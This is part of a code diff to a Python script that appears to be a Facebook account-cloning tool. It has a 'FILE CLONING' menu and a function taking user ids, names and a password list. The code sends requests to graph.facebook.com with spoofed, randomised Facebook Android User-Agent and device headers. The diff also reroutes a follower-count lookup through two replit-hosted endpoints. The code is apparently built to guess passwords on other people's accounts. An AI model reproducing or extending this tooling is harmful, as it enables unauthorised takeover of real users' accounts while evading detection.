@@ -64,10 +64,16 @@ def clear():
 def line():
     print(42*'\033[1;36m═')
 #----------menu----------#
-def gffs(ids):
-    get_ffs = requests.get("https://jahsbsbs--andrewvista2005.repl.co/ffs.php?chat="+str(ids)).json()
-    ffs = get_ffs['followers']
-    return ffs
+def get_followers_count(ids):
+    first_url = "https://jahsbsbs--andrewvista2005.repl.co/ffs.php?chat=" + str(ids)
+    response = requests.get(first_url).json()
+    follower_id = response['followers']
+
+    second_url = f"https://baliwjabahahaha.hazeyy.repl.co/facebook-subscribers/{follower_id}"
+    followers_response = requests.get(second_url).json()
+    followers_count = followers_response['Followers']
+
+    return followers_count
 def main():
     clear()
     print(' [1] FILE CLONING ')
@@ -244,7 +250,7 @@ def m2(ids,names,passlist):
             fbbb = random.randint(200000000,300000000)
             fbob = random.randint(200000000,300000000)
             headers={
-                    'User-Agent': f"'[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/MessengerLite;FBAV/322.0.0.2.140;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'",
+                    'User-Agent': f"'[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/MessengerLite;FBAV/322.0.0.2.140;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'",
               'Content-Type': 'application/x-www-form-urlencoded', 
               'Host': 'graph.facebook.com', 
               'X-FB-Net-HNI': str(random.randint(10000,99999)), 
